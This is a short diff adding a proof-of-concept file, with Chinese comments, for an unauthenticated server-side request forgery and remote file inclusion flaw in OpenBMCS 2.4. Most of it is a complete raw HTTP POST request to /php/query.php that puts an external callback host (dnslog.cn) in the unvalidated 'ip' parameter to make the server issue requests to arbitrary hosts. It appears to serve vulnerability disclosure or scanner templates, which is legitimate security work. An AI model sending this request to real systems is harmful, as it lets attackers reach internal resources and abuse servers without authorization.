@@ -1,0 +1,10 @@
+# OpenBMCS 服务器请求伪造漏洞
+# OpenBMCS 2.4在其功能中容易受到未经身份验证的服务器端请求伪造和远程文件包含漏洞的影响。默认情况下，应用程序解析POST参数“ip”中用户提供的数据，以查询端口81上的服务器ip。由于未对参数进行验证，攻击者可以指定外部域并强制应用程序向任意目标主机发出HTTP请求。
+POST /php/query.php?acid=80001699&bid=hd_tag_m8mv25bm HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25bm
+RM-PRO-Token: b9f8bf300d3d757fe2a65ac3a51bb641
+RM-PRO-Time: 1742808457813
+User-Agent: curl/7.83.1
+
+ip=http://dnslog.cn:80&argu=/
